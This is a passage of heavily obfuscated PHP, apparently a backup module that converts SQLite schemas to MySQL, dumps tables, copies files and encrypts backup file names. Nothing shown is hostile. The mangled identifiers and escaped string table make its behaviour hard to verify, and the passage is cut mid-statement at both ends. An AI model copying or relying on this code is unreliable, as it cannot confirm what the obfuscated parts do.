$ç¯½¨´À[] = sprintf($³‰÷„øÛ[1230], $³‰÷„øÛ[1231], $¾œ¹Ö›, $³‰÷„øÛ[1232], $ø¿³­ö, $³‰÷„øÛ[1233], $ÍŒ¶Ì²Ã, $êéÄÂÊè); } $¥òì…×± = array(); $–•ÕÂ­ = array($³‰÷„øÛ[1234] => $³‰÷„øÛ[400], $³‰÷„øÛ[1235] => $³‰÷„øÛ[400], $³‰÷„øÛ[374] => $³‰÷„øÛ[400], $³‰÷„øÛ[373] => $³‰÷„øÛ[400], $³‰÷„øÛ[1236] => $³‰÷„øÛ[1237], $³‰÷„øÛ[1238] => $³‰÷„øÛ[1237], $³‰÷„øÛ[1237] => $³‰÷„øÛ[1237], $³‰÷„øÛ[1239] => $³‰÷„øÛ[1237], $³‰÷„øÛ[293] => $³‰÷„øÛ[1237], $³‰÷„øÛ[1240] => $³‰÷„øÛ[1237], $³‰÷„øÛ[1241] => $³‰÷„øÛ[1237], $³‰÷„øÛ[1242] => $³‰÷„øÛ[1243], $³‰÷„øÛ[375] => $³‰÷„øÛ[1243], $³‰÷„øÛ[376] => $³‰÷„øÛ[1243], $³‰÷„øÛ[1244] => $³‰÷„øÛ[1244]); foreach ($¨ºşÌª— as $òƒâÓ®Ò) { $˜âòˆÊ = _get($–•ÕÂ­, $òƒâÓ®Ò[$³‰÷„øÛ[1245]], $òƒâÓ®Ò[$³‰÷„øÛ[1246]]); $ÓÔ€‰Ñ¬ = $òƒâÓ®Ò[$³‰÷„øÛ[1247]] == $³‰÷„øÛ[1011] ? $³‰÷„øÛ[1248] : $³‰÷„øÛ[1249]; $Ì«›’ÙÏ = $òƒâÓ®Ò[$³‰÷„øÛ[1250]] == $×ÃÆÅ¬ ? $³‰÷„øÛ[1251] : $³‰÷„øÛ[12]; $Ç‚•©ñ = $òƒâÓ®Ò[$³‰÷„øÛ[1065]] ? strtoupper(str_replace($³‰÷„øÛ[11], $³‰÷„øÛ[12], $òƒâÓ®Ò[$³‰÷„øÛ[1065]])) : $³‰÷„øÛ[12]; $¥òì…×±[] = sprintf($³‰÷„øÛ[1252], $òƒâÓ®Ò[$³‰÷„øÛ[1250]], $˜âòˆÊ, $ÓÔ€‰Ñ¬, $Ì«›’ÙÏ, $Ç‚•©ñ); } $Ğ¦×¹õÂ = array("\104\122\x4f\120\x20\x54\x41\x42\114\105\x20\111\106\x20\x45\x58\x49\x53\124\123\x20{$ğ´‰’Ÿ»}\73", "\x43\x52\105\101\x54\105\x20\124\101\x42\x4c\x45\x20{$ğ´‰’Ÿ»}\40\x28", implode($³‰÷„øÛ[50] . PHP_EOL, $¥òì…×±), $³‰÷„øÛ[1253]); $‹ë¾òúŞ = implode(PHP_EOL, array_merge($Ğ¦×¹õÂ, $ç¯½¨´À)); if ($˜âòˆÊ == $³‰÷„øÛ[13]) { return $‹ë¾òúŞ; } $›­“Ûª[$³‰÷„øÛ[13]] = $‹ë¾òúŞ; return $›­“Ûª; } public function sqlFromSqlite($¢ÓÓ¥Ù‚, $Äó¶ Ôê = '') { $“¦³¯Äã =& $_SERVER[áäÒ½¯Ç]; $ÃÇâŸ€ = array($“¦³¯Äã[906] => $“¦³¯Äã[12], $“¦³¯Äã[13] => $“¦³¯Äã[12]); $‡†×ö = $this->escapeName($¢ÓÓ¥Ù‚); $¢°®±ëÎ = $this->escapeName($¢ÓÓ¥Ù‚, $“¦³¯Äã[13]); $¾ñ…££ = $this->model()->db(); $ä‡öÑƒ¦ = "\x50\x52\101\x47\115\101\x20\x54\x41\102\114\105\x5f\x49\x4e\x46\117\40\50\x27{$¢ÓÓ¥Ù‚}\x27\x29"; $Æ…çíŞê = "\123\105\x4c\105\103\124\x20\x2a\40\x46\x52\x4f\115\x20\x73\161\154\151\x74\145\x5f\155\141\x73\x74\x65\162\x20\x57\110\105\x52\x45\x20\x74\x62\x6c\x5f\x6e\141\155\x65\40\x3d\x20\x27{$¢ÓÓ¥Ù‚}\47"; $¡ß³¡µÉ = $¾ñ…££->query($ä‡öÑƒ¦); if (empty($¡ß³¡µÉ)) { return $Äó¶ Ôê ? $ÃÇâŸ€[$Äó¶ Ôê] : $ÃÇâŸ€; } $¡°®àäÅ = $¾ñ…££->query($Æ…çíŞê); $ÃôšƒĞ¢ = $ôö¥€ = array(); foreach ($¡°®àäÅ as $ô¾‹æÆí) { if ($ô¾‹æÆí[$“¦³¯Äã[33]] == $“¦³¯Äã[367]) { $ÃôšƒĞ¢[] = $ô¾‹æÆí[$“¦³¯Äã[1254]]; } else { $ôö¥€[] = $ô¾‹æÆí[$“¦³¯Äã[1254]]; } } $ãÌÇäŸÒ = array_merge(array("\x44\122\117\120\x20\124\x41\x42\x4c\x45\40\x49\x46\40\105\130\111\x53\x54\123\x20{$¢°®±ëÎ}\x3b"), $ÃôšƒĞ¢, $ôö¥€); $ãÌÇäŸÒ = implode($“¦³¯Äã[74] . PHP_EOL, $ãÌÇäŸÒ) . $“¦³¯Äã[74]; if ($Äó¶ Ôê == $“¦³¯Äã[13]) { return $ãÌÇäŸÒ; } $ÃÇâŸ€[$“¦³¯Äã[13]] = $ãÌÇäŸÒ; $ØÅíè˜Œ = $Ğ°°ÃÚ‡ = array(); $³íù¼‰„ = array(); $óğ¢ûÊÈ = array(); foreach ($¡°®àäÅ as $ô¾‹æÆí) { if ($ô¾‹æÆí[$“¦³¯Äã[33]] == $“¦³¯Äã[1255]) { $øñ–Õô€ = $ô¾‹æÆí[$“¦³¯Äã[1254]]; $çÓİ˜’ = stripos($øñ–Õô€, $“¦³¯Äã[1224]) !== !1; $øßá«ª = stripos($øñ–Õô€, $“¦³¯Äã[1218]) !== !1; preg_match($“¦³¯Äã[1256], $øñ–Õô€, $×ç——ëë); if (empty($×ç——ëë)) { continue; } $Áç¶úËÊ = array_map($“¦³¯Äã[1257], explode($“¦³¯Äã[50], $×ç——ëë[1])); $¶óÁ¡˜’ = array(); foreach ($Áç¶úËÊ as $çÌ¹Şäƒ) { $ˆ±Â’şÜ = trim($çÌ¹Şäƒ, $“¦³¯Äã[1258]); $¶óÁ¡˜’[] = $ˆ±Â’şÜ; $³íù¼‰„[$ˆ±Â’şÜ] = !0; } $óğ¢ûÊÈ[] = array($“¦³¯Äã[32] => $ô¾‹æÆí[$“¦³¯Äã[32]], $“¦³¯Äã[1254] => $øñ–Õô€, $“¦³¯Äã[1259] => $çÓİ˜’, $“¦³¯Äã[1260] => $øßá«ª, $“¦³¯Äã[1261] => $¶óÁ¡˜’); } } $õ–ğèÒ = array($“¦³¯Äã[1235] => $“¦³¯Äã[1235], $“¦³¯Äã[400] => $“¦³¯Äã[1262], $“¦³¯Äã[1243] => $“¦³¯Äã[1263], $“¦³¯Äã[1237] => $“¦³¯Äã[1237], $“¦³¯Äã[1244] => $“¦³¯Äã[1264], $“¦³¯Äã[1265] => $“¦³¯Äã[1266]); $€•Şùƒ¡ = array($“¦³¯Äã[460], $“¦³¯Äã[169], $“¦³¯Äã[545]); $Å°—ı÷² = array($“¦³¯Äã[400], $“¦³¯Äã[1243], $“¦³¯Äã[1265], $“¦³¯Äã[1235]); foreach ($¡ß³¡µÉ as $ô¾‹æÆí) { $›Ôú¢ = $ô¾‹æÆí[$“¦³¯Äã[32]]; $ößÛ²¦ = strtolower($ô¾‹æÆí[$“¦³¯Äã[33]]); if ($ößÛ²¦ == $“¦³¯Äã[1237] && isset($³íù¼‰„[$›Ôú¢])) { $Äó¶ Ôê = in_array($›Ôú¢, $€•Şùƒ¡) ? $“¦³¯Äã[1237] : $“¦³¯Äã[1267]; } else { $Äó¶ Ôê = _get($õ–ğèÒ, $ößÛ²¦, $ößÛ²¦); } if ($ô¾‹æÆí[$“¦³¯Äã[57]] > 0) { $Ğ°°ÃÚ‡[$ô¾‹æÆí[$“¦³¯Äã[57]]] = $›Ôú¢; } $ëİÑ¿£É = $“¦³¯Äã[12]; if ($ô¾‹æÆí[$“¦³¯Äã[56]] !== null) { $ú·ŞÜˆ” = $ô¾‹æÆí[$“¦³¯Äã[56]]; if (in_array($ößÛ²¦, $Å°—ı÷²) && is_numeric($ú·ŞÜˆ”)) { $ëİÑ¿£É = "\x44\105\x46\101\125\114\124\x20{$ú·ŞÜˆ”}"; } else { if (strtolower($ú·ŞÜˆ”) === $“¦³¯Äã[104]) { $ëİÑ¿£É = $ô¾‹æÆí[$“¦³¯Äã[35]] ? $“¦³¯Äã[12] : $“¦³¯Äã[1249]; } else { $Ëˆ¥Ì’÷ = is_numeric($ú·ŞÜˆ”) ? $ú·ŞÜˆ” : $“¦³¯Äã[58] . addslashes($ú·ŞÜˆ”) . $“¦³¯Äã[58]; $ëİÑ¿£É = "\x44\x45\106\x41\x55\114\124\40{$Ëˆ¥Ì’÷}"; } } } $‘Î¿”œ‡ = $ô¾‹æÆí[$“¦³¯Äã[35]] ? $“¦³¯Äã[1248] : $“¦³¯Äã[1268]; $öó·€³« = stripos($ößÛ²¦, $“¦³¯Äã[374]) !== !1 && $ô¾‹æÆí[$“¦³¯Äã[57]] ? $“¦³¯Äã[1269] : $“¦³¯Äã[12]; $ØÅíè˜Œ[] = sprintf($“¦³¯Äã[1270], $›Ôú¢, $Äó¶ Ôê, $‘Î¿”œ‡, $ëİÑ¿£É, $öó·€³«); } if (!empty($Ğ°°ÃÚ‡)) { ksort($Ğ°°ÃÚ‡); $¨¼î’—¯ = $“¦³¯Äã[481] . implode($“¦³¯Äã[1190], $Ğ°°ÃÚ‡) . $“¦³¯Äã[481]; $ØÅíè˜Œ[] = "\120\122\x49\x4d\101\x52\131\x20\113\x45\131\40\x28{$¨¼î’—¯}\51"; } foreach ($óğ¢ûÊÈ as $¤ığ«­) { if ($¤ığ«­[$“¦³¯Äã[1260]]) { continue; } $ËßáËÎÅ = array(); foreach ($¤ığ«­[$“¦³¯Äã[1261]] as $çÌ¹Şäƒ) { $õ–ğèÒ = null; foreach ($¡ß³¡µÉ as $İßÓêÄ‚) { if ($İßÓêÄ‚[$“¦³¯Äã[32]] == $çÌ¹Şäƒ) { $õ–ğèÒ = strtolower($İßÓêÄ‚[$“¦³¯Äã[33]]); break; } } if ($õ–ğèÒ == $“¦³¯Äã[1237] && in_array($çÌ¹Şäƒ, $€•Şùƒ¡)) { $ËßáËÎÅ[] = "\x60{$çÌ¹Şäƒ}\140\x28\62\x35\60\51"; } else { $ËßáËÎÅ[] = "\x60{$çÌ¹Şäƒ}\x60"; } } $ößÛ²¦ = ($¤ığ«­[$“¦³¯Äã[1259]] ? $“¦³¯Äã[1271] : $“¦³¯Äã[12]) . $“¦³¯Äã[1272]; $œŒëµª· = str_replace($“¦³¯Äã[1225] . $¢ÓÓ¥Ù‚ . $“¦³¯Äã[11], $“¦³¯Äã[12], $¤ığ«­[$“¦³¯Äã[32]]); $œŒëµª· = str_replace($¢ÓÓ¥Ù‚ . $“¦³¯Äã[11], $“¦³¯Äã[12], $œŒëµª·); $ØÅíè˜Œ[] = "{$ößÛ²¦}\40\x60{$œŒëµª·}\140\40\50" . implode($“¦³¯Äã[50], $ËßáËÎÅ) . $“¦³¯Äã[1189]; } $å‡‹óó = array("\104\122\117\120\40\124\101\x42\x4c\x45\40\x49\x46\40\x45\x58\x49\x53\124\x53\40{$‡†×ö}\73", "\103\122\105\x41\x54\105\x20\x54\x41\x42\114\105\x20{$‡†×ö}\40\50", implode($“¦³¯Äã[50] . PHP_EOL, $ØÅíè˜Œ), $“¦³¯Äã[1273]); $å‡‹óó = implode(PHP_EOL, $å‡‹óó); if ($Äó¶ Ôê == $“¦³¯Äã[906]) { return $å‡‹óó; } $ÃÇâŸ€[$“¦³¯Äã[906]] = $å‡‹óó; return $ÃÇâŸ€; } private function escapeName($·Ê•¨¿®, $À•É“ô = "\155\x79\x73\x71\x6c") { $¶¬Åñ•Á =& $_SERVER[áäÒ½¯Ç]; $·Ê•¨¿® = preg_replace($¶¬Åñ•Á[1274], $¶¬Åñ•Á[12], $·Ê•¨¿®); if ($À•É“ô === $¶¬Åñ•Á[906]) { return "\x60{$·Ê•¨¿®}\140"; } return "\42{$·Ê•¨¿®}\42"; } public function mixBakList($˜Õ÷â‘ö) { $õ„¿‘ÊÂ =& $_SERVER[áäÒ½¯Ç]; $˜Õ÷â‘ö = rtrim($˜Õ÷â‘ö, $õ„¿‘ÊÂ[8]) . $õ„¿‘ÊÂ[8]; $ÉÓŸƒ­ê = $õ„¿‘ÊÂ[1275]; $Ø­õ£Ÿ = IO::listPath($˜Õ÷â‘ö); if (empty($Ø­õ£Ÿ[$õ„¿‘ÊÂ[86]])) { return !1; } $õ½²ÁÛÂ = array(); foreach ($Ø­õ£Ÿ[$õ„¿‘ÊÂ[86]] as $¾ãÀÕÆÁ => $¡£êô§ç) { if (!$¡£êô§ç[$õ„¿‘ÊÂ[32]] || !$¡£êô§ç[$õ„¿‘ÊÂ[87]]) { continue; } $÷ú«İ÷½ = Mcrypt::encode($¡£êô§ç[$õ„¿‘ÊÂ[32]], $ÉÓŸƒ­ê); $È“â = md5($÷ú«İ÷½); IO::rename($¡£êô§ç[$õ„¿‘ÊÂ[87]], $È“â); $õ½²ÁÛÂ[$È“â] = $÷ú«İ÷½; } $èö´œ¸ = md5($õ„¿‘ÊÂ[1276] . $ÉÓŸƒ­ê); IO::setContent($˜Õ÷â‘ö . $èö´œ¸, json_encode($õ½²ÁÛÂ)); return !0; } public function unmixBakList($×ğâõº) { $¼ø‰ëÅ· =& $_SERVER[áäÒ½¯Ç]; $×ğâõº = rtrim($×ğâõº, $¼ø‰ëÅ·[8]) . $¼ø‰ëÅ·[8]; $ä‰û³øõ = $this->unmixBakListGet($×ğâõº, !0); if (empty($ä‰û³øõ)) { return !1; } foreach ($ä‰û³øõ as $„ß…ÆŞä => $„ñğÌ®) { $å×³»§Û = IO::rename($×ğâõº . $„ñğÌ®, $„ß…ÆŞä); if (!$å×³»§Û) { return !1; } } return !0; } public function unmixBakListGet($²êó¨È‘, $ì¤ÏªŒ÷ = false) { $ˆì¢†œû =& $_SERVER[áäÒ½¯Ç]; $²êó¨È‘ = rtrim($²êó¨È‘, $ˆì¢†œû[8]) . $ˆì¢†œû[8]; $ĞóŸÎıı = $ˆì¢†œû[1275]; $¬¯Êñİ = md5($ˆì¢†œû[1276] . $ĞóŸÎıı); $’â¡ó¿ú = $²êó¨È‘ . $¬¯Êñİ; if (!IO::exist($’â¡ó¿ú)) { return !1; } $”¶öÏ¬ = json_decode(IO::getContent($’â¡ó¿ú), !0); if (empty($”¶öÏ¬)) { return !1; } $í²ñ»€é = array(); foreach ($”¶öÏ¬ as $×¯Ì€É» => $ö…˜øÇ”) { $¬¯Êñİ = Mcrypt::decode($ö…˜øÇ”, $ĞóŸÎıı); $í²ñ»€é[$¬¯Êñİ] = $×¯Ì€É»; } if ($ì¤ÏªŒ÷) { IO::remove($’â¡ó¿ú, !1); } return $í²ñ»€é; } } goto C»Œš¨Ì‹; a“¤«„Ö: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $ÌÁ˜Òà¤ =& $_SERVER[áäÒ½¯Ç]; $ïÏşÛ¦ = Backup::get(); self::$io = $ïÏşÛ¦[$ÌÁ˜Òà¤[854]]; self::$name = $ïÏşÛ¦[$ÌÁ˜Òà¤[32]]; $†ï¼Ìµå = new DbManage(); $Ğòâ•õá = $†ï¼Ìµå->dbType(); $½Ğò÷©¿ = array($ÌÁ˜Òà¤[883] => $Ğòâ•õá, $ÌÁ˜Òà¤[884] => time()); Backup::set($½Ğò÷©¿); $İ°ß»¸ = $this->tmpFilesPath() . $ÌÁ˜Òà¤[885] . self::$name . $ÌÁ˜Òà¤[8]; del_dir($İ°ß»¸); mk_dir($İ°ß»¸); $Â˜ÆÍïò = $ËóÂó’ = 0; try { $ÚÛÕæü£ = $†ï¼Ìµå->db()->getTables(); } catch (Exception $Â‰‰âšò) { Backup::log($ÌÁ˜Òà¤[886] . $Â‰‰âšò->getMessage()); return !1; } $ÚÛÕæü£ = array_diff($ÚÛÕæü£, array($ÌÁ˜Òà¤[887], $ÌÁ˜Òà¤[888])); foreach ($ÚÛÕæü£ as $­¡•“‡ã) { if ($­¡•“‡ã == $ÌÁ˜Òà¤[889]) { continue; } $Â˜ÆÍïò += $†ï¼Ìµå->model($­¡•“‡ã)->count(); } $ƒÓ•–¡® = new Task($ÌÁ˜Òà¤[890], $ÌÁ˜Òà¤[882], $Â˜ÆÍïò, LNG($ÌÁ˜Òà¤[891]) . $ÌÁ˜Òà¤[892] . LNG($ÌÁ˜Òà¤[893])); $GLOBALS[$ÌÁ˜Òà¤[894]] = self::$name; foreach ($ÚÛÕæü£ as $­¡•“‡ã) { $ªş¸ÈçÕ = $İ°ß»¸ . $­¡•“‡ã . $ÌÁ˜Òà¤[895]; if ($­¡•“‡ã == $ÌÁ˜Òà¤[889]) { @touch($ªş¸ÈçÕ); continue; } $¢Æğ¢ã = null; if ($­¡•“‡ã == $ÌÁ˜Òà¤[896] && $ïÏşÛ¦[$ÌÁ˜Òà¤[169]] == $ÌÁ˜Òà¤[881]) { $¢Æğ¢ã = self::$io; } $ËóÂó’ += $†ï¼Ìµå->sqlFromDb($­¡•“‡ã, $ªş¸ÈçÕ, $ƒÓ•–¡®, $¢Æğ¢ã); } unset($GLOBALS[$ÌÁ˜Òà¤[894]]); $ƒÓ•–¡®->end(); if ($ËóÂó’ > $Â˜ÆÍïò) { $Â˜ÆÍïò = $ËóÂó’; } $½Ğò÷©¿ = array($ÌÁ˜Òà¤[883] => $Ğòâ•õá, $ÌÁ˜Òà¤[878] => 1, $ÌÁ˜Òà¤[897] => $Â˜ÆÍïò, $ÌÁ˜Òà¤[898] => $ËóÂó’, $ÌÁ˜Òà¤[899] => time()); Backup::set($½Ğò÷©¿); if ($Â˜ÆÍïò - $ËóÂó’ > 0) { $îİŞ›–± = $ÌÁ˜Òà¤[900]; if (!stristr(I18n::getType(), $ÌÁ˜Òà¤[901])) { $îİŞ›–± = $ÌÁ˜Òà¤[902]; } Backup::log(array($îİŞ›–±, $½Ğò÷©¿)); return !1; } return !0; } private function tmpFilesPath() { $©”†Á¶ =& $_SERVER[áäÒ½¯Ç]; $°¶½‚ÍŸ = TEMP_FILES; if ($GLOBALS[$©”†Á¶[6]][$©”†Á¶[92]][$©”†Á¶[903]]) { $°¶½‚ÍŸ = $GLOBALS[$©”†Á¶[6]][$©”†Á¶[92]][$©”†Á¶[903]]; if (!mk_dir($°¶½‚ÍŸ) || !is_writable($°¶½‚ÍŸ) || !IO::mkfile($°¶½‚ÍŸ . $©”†Á¶[904])) { $°¶½‚ÍŸ = TEMP_FILES; } } return $°¶½‚ÍŸ; } } class BackupDbFile { public function __construct() { } public function index() { $«•€™ =& $_SERVER[áäÒ½¯Ç]; $ø¯„Ô¼Æ = Backup::get(); $ŸÉ—¯£• = $ø¯„Ô¼Æ[$«•€™[32]]; $è˜¦Èå = $this->tmpFilesPath() . "\142\x61\143\x6b\165\x70\x5f{$ŸÉ—¯£•}\57"; $ö…¬ÌÔ³ = $this->backupPath($ø¯„Ô¼Æ); if (!($ö…¬ÌÔ³ = IO::mkdir($ö…¬ÌÔ³))) { Backup::log($«•€™[905] . $ö…¬ÌÔ³); return !1; } $óÁàÛ«Æ = new DbManage(); $ºÀ×öÆÏ = $óÁàÛ«Æ->getSqlFile(); if (!$ºÀ×öÆÏ || !$ºÀ×öÆÏ[$«•€™[906]] || !$ºÀ×öÆÏ[$«•€™[13]]) { Backup::log($«•€™[907]); return !1; } IO::move($ºÀ×öÆÏ[$«•€™[906]], $è˜¦Èå); IO::move($ºÀ×öÆÏ[$«•€™[13]], $è˜¦Èå); $óÁàÛ«Æ->mixBakList($è˜¦Èå); $¶¿²¼Ü‘ = IO::listPath($è˜¦Èå); $øÙ™Ø®ƒ = isset($¶¿²¼Ü‘[$«•€™[86]]) ? $¶¿²¼Ü‘[$«•€™[86]] : array(); $½õØéã§ = array_sum(array_column($øÙ™Ø®ƒ, $«•€™[79])); if (!$½õØéã§) { Backup::log($«•€™[908] . $è˜¦Èå); return !1; } $ëØ…àí = array($«•€™[909] => $½õØéã§, $«•€™[910] => time()); Backup::set($ëØ…àí); Hook::trigger($«•€™[911], $è˜¦Èå, $ö…¬ÌÔ³); $“¢ĞŒòş = new TaskFileTransfer($«•€™[911], $«•€™[882], count($øÙ™Ø®ƒ), LNG($«•€™[891]) . $«•€™[482] . LNG($«•€™[893]) . $«•€™[912]); $“¢ĞŒòş->task[$«•€™[866]] = $½õØéã§; foreach ($¶¿²¼Ü‘[$«•€™[86]] as $‹ËàÎ¯‹) { $÷›àÔË¡ = IO::move($‹ËàÎ¯‹[$«•€™[87]], $ö…¬ÌÔ³); if (!$÷›àÔË¡) { $“¢ĞŒòş->end(); $İŞ¨‚› = IO::getLastError($«•€™[913] . $‹ËàÎ¯‹[$«•€™[87]] . $«•€™[914] . $ö…¬ÌÔ³ . $«•€™[176]); Backup::log($İŞ¨‚›); return !1; } } $“¢ĞŒòş->end(); $ëØ…àí = array($«•€™[915] => $½õØéã§, $«•€™[916] => time()); Backup::set($ëØ…àí); return !0; } private function backupPath($ “Á×óè) { $ø¯‹Şç¸ =& $_SERVER[áäÒ½¯Ç]; $ñ£Úìß = $ “Á×óè[$ø¯‹Şç¸[32]]; $‹Œ¥üØÛ = Model($ø¯‹Şç¸[875])->get($ø¯‹Şç¸[876]); $ÏµÚœ’ä = substr(md5($ø¯‹Şç¸[877] . $‹Œ¥üØÛ . $ñ£Úìß), 0, 8); return "\x7b\151\x6f\72{$ “Á×óè[$ø¯‹Şç¸[854]]}\x7d\57\x64\x61\x74\141\x62\x61\163\145\x2f\x62\x61\x63\153\165\x70\x2f" . $ñ£Úìß . $ø¯‹Şç¸[11] . $ÏµÚœ’ä; } private function tmpFilesPath() { $Ì§¦Íü =& $_SERVER[áäÒ½¯Ç]; $ãëğ½’Ó = TEMP_FILES; if ($GLOBALS[$Ì§¦Íü[6]][$Ì§¦Íü[92]][$Ì§¦Íü[903]]) { $ãëğ½’Ó = $GLOBALS[$Ì§¦Íü[6]][$Ì§¦Íü[92]][$Ì§¦Íü[903]]; if (!mk_dir($ãëğ½’Ó) || !is_writable($ãëğ½’Ó) || !IO::mkfile($ãëğ½’Ó . $Ì§¦Íü[904])) { $ãëğ½’Ó = TEMP_FILES; } } return $ãëğ½’Ó; } } class BackupFile { public function __construct() { } public function index() { $’€ÆôØ = Backup::get(); $ãı‰ªÒö = $’€ÆôØ[$_SERVER[áäÒ½¯Ç][858]][$_SERVER[áäÒ½¯Ç][241]][$_SERVER[áäÒ½¯Ç][562]]; $òÉ¬ä‹½ = array($_SERVER[áäÒ½¯Ç][563] => array($_SERVER[áäÒ½¯Ç][917], $ãı‰ªÒö), $_SERVER[áäÒ½¯Ç][918] => array($_SERVER[áäÒ½¯Ç][416], $’€ÆôØ[$_SERVER[áäÒ½¯Ç][854]])); $´¹¿˜—÷ = (int) Model($_SERVER[áäÒ½¯Ç][896])->where($òÉ¬ä‹½)->count($_SERVER[áäÒ½¯Ç][562]); $Ë¶ù»¡º = (int) Model($_SERVER[áäÒ½¯Ç][896])->where($òÉ¬ä‹½)->sum($_SERVER[áäÒ½¯Ç][79]); $ø¹´âÇ = new TaskFileTransfer($_SERVER[áäÒ½¯Ç][919], $_SERVER[áäÒ½¯Ç][882], $´¹¿˜—÷, LNG($_SERVER[áäÒ½¯Ç][891]) . $_SERVER[áäÒ½¯Ç][892] . LNG($_SERVER[áäÒ½¯Ç][920])); $ø¹´âÇ->task[$_SERVER[áäÒ½¯Ç][866]] = $Ë¶ù»¡º; $×¤Ø¤¾¤ = array($_SERVER[áäÒ½¯Ç][921] => $´¹¿˜—÷, $_SERVER[áäÒ½¯Ç][922] => $Ë¶ù»¡º, $_SERVER[áäÒ½¯Ç][923] => time()); Backup::set($×¤Ø¤¾¤); $¹Ã‘úÊ„ = !0; $´­Úø£ù = $this->storeIds(); $€ ­´œÌ = 1; $›ªĞ†àº = 1000; $¦Œ­í½ş = $şàï³¼ê = 0; $®íŒßÉğ = array(); $±ïæ¢Ë¬ = $ğòáşÂà = 0; do { $à¹­ªı = $_SERVER[áäÒ½¯Ç][924]; $³¼úµØş = Model($_SERVER[áäÒ½¯Ç][896])->where($òÉ¬ä‹½)->field($à¹­ªı)->order($_SERVER[áäÒ½¯Ç][925])->selectPage($›ªĞ†àº, $€ ­´œÌ); $Å±ˆêõ¿ = !empty($³¼úµØş[$_SERVER[áäÒ½¯Ç][455]]) ? $³¼úµØş[$_SERVER[áäÒ½¯Ç][455]] : array(); foreach ($Å±ˆêõ¿ as $ëÊêêº) { if (!$this->_fileExist($ëÊêêº, $®íŒßÉğ, $´­Úø£ù)) { Backup::log($_SERVER[áäÒ½¯Ç][926] . $ëÊêêº[$_SERVER[áäÒ½¯Ç][562]] . $_SERVER[áäÒ½¯Ç][927] . $ëÊêêº[$_SERVER[áäÒ½¯Ç][87]]); continue; } $òº“µ‰ì = $ëÊêêº[$_SERVER[áäÒ½¯Ç][87]]; $ÖëÈã´à = "\173\x69\157\72{$’€ÆôØ[$_SERVER[áäÒ½¯Ç][854]]}\x7d" . substr($òº“µ‰ì, strlen("\x7b\151\x6f\72{$ëÊêêº[$_SERVER[áäÒ½¯Ç][928]]}\175")); if (IO::exist($ÖëÈã´à)) { $ø¹´âÇ->updateFileEnd($ëÊêêº[$_SERVER[áäÒ½¯Ç][32]], $ëÊêêº[$_SERVER[áäÒ½¯Ç][79]]); } else { $ÖëÈã´à = get_path_father($ÖëÈã´à); IO::mkdir($ÖëÈã´à); if (!IO::copy($òº“µ‰ì, $ÖëÈã´à, $_SERVER[áäÒ½¯Ç][929])) { Backup::log($_SERVER[áäÒ½¯Ç][930] . $òº“µ‰ì . $_SERVER[áäÒ½¯Ç][914] . $ÖëÈã´à . $_SERVER[áäÒ½¯Ç][176]); $¹Ã‘úÊ„ = !1; break; } } $ãı‰ªÒö = $ëÊêêº[$_SERVER[áäÒ½¯Ç][562]]; $şàï³¼ê += 1; $¦Œ­í½ş += $ëÊêêº[$_SERVER[áäÒ½¯Ç][79]]; $ğòáşÂà += 1; $±ïæ¢Ë¬ += $ëÊêêº[$_SERVER[áäÒ½¯Ç][79]]; if ($¦Œ­í½ş >= 1024 * 1024 * 100) { $×¤Ø¤¾¤ = array($_SERVER[áäÒ½¯Ç][853] => $ãı‰ªÒö, $_SERVER[áäÒ½¯Ç][931] => $ğòáşÂà, $_SERVER[áäÒ½¯Ç][932] => $±ïæ¢Ë¬); Backup::set($×¤Ø¤¾¤); $¦Œ­í½ş = $şàï³¼ê = 0; } } $‰€Ì³Øí = count($Å±ˆêõ¿); $€ ­´œÌ++; } while ($‰€Ì³Øí == $›ªĞ†àº); $ø¹´âÇ->end(); $×¤Ø¤¾¤ = array($_SERVER[áäÒ½¯Ç][933] => 1, $_SERVER[áäÒ½¯Ç][864] => time(), $_SERVER[áäÒ½¯Ç][880] => 1, $_SERVER[áäÒ½¯Ç][853] => $ãı‰ªÒö, $_SERVER[áäÒ½¯Ç][934] => time()); if ($şàï³¼ê) { $×¤Ø¤¾¤[$_SERVER[áäÒ½¯Ç][931]] = $ğòáşÂà; $×¤Ø¤¾¤[$_SERVER[áäÒ½¯Ç][932]] = $±ïæ¢Ë¬; } Backup::set($×¤Ø¤¾¤); return !0; } private function _fileExist($†š¿ÉÂã, &$ ş…üéú, $„¹‚â†µ) { $İÄ÷ˆœú =& $_SERVER[áäÒ½¯Ç]; $Î›êİş‘ = $†š¿ÉÂã[$İÄ÷ˆœú[87]]; if (in_array($†š¿ÉÂã[$İÄ÷ˆœú[562]], $ ş…üéú)) { return !1; } if (!in_array($†š¿ÉÂã[$İÄ÷ˆœú[928]], $„¹‚â†µ)) { return !1; } if (IO::exist($Î›êİş‘)) { return !0; } $¯ØîÃÕï = get_path_father($Î›êİş‘); if (IO::exist($¯ØîÃÕï)) { $ ş…üéú[] = $†š¿ÉÂã[$İÄ÷ˆœú[562]]; return !1; } $´ĞîÓ©« = array($İÄ÷ˆœú[928] => $†š¿ÉÂã[$İÄ÷ˆœú[928]], $İÄ÷ˆœú[87] => array($İÄ÷ˆœú[479], "{$¯ØîÃÕï}\45")); $ÕÏóê™ = Model($İÄ÷ˆœú[896])->where($´ĞîÓ©«)->field($İÄ÷ˆœú[563])->select(); $ ş…üéú = array_merge($ ş…üéú, array_to_keyvalue($ÕÏóê™, $İÄ÷ˆœú[12], $İÄ÷ˆœú[562])); return !1; } private function _fileFilter($âÖØŸµ•) { $®î«ù†º =& $_SERVER[áäÒ½¯Ç]; return; if (empty($âÖØŸµ•)) { return; } $š¸ÖŠá† = array($®î«ù†º[562] => array($®î«ù†º[7], array_unique($âÖØŸµ•))); $ÃÆõšËØ = Model($®î«ù†º[935])->where($š¸ÖŠá†)->field($®î«ù†º[192])->select(); foreach ($ÃÆõšËØ as $Åßªôúã) { Model($®î«ù†º[935])->remove($Åßªôúã[$®î«ù†º[192]], !1); } } private function storeIds() { $ÓÄ¥ç‚º =& $_SERVER[áäÒ½¯Ç]; $ûğêèÅş = Model($ÓÄ¥ç‚º[870])->listData(); $ê¡™ßåÀ = array(); $Ù˜Ô‚÷Ş = $GLOBALS[$ÓÄ¥ç‚º[6]][$ÓÄ¥ç‚º[92]][$ÓÄ¥ç‚º[936]]; foreach ($ûğêèÅş as $©Ì‡—Şä) { $‘…«ÚÀì = strtolower($©Ì‡—Şä[$ÓÄ¥ç‚º[96]]); if (!isset($Ù˜Ô‚÷Ş[$‘…«ÚÀì])) { continue; } $•åÕü = $ÓÄ¥ç‚º[77] . (isset($Ù˜Ô‚÷Ş[$‘…«ÚÀì]) ? $Ù˜Ô‚÷Ş[$‘…«ÚÀì] : ucfirst($‘…«ÚÀì)); if 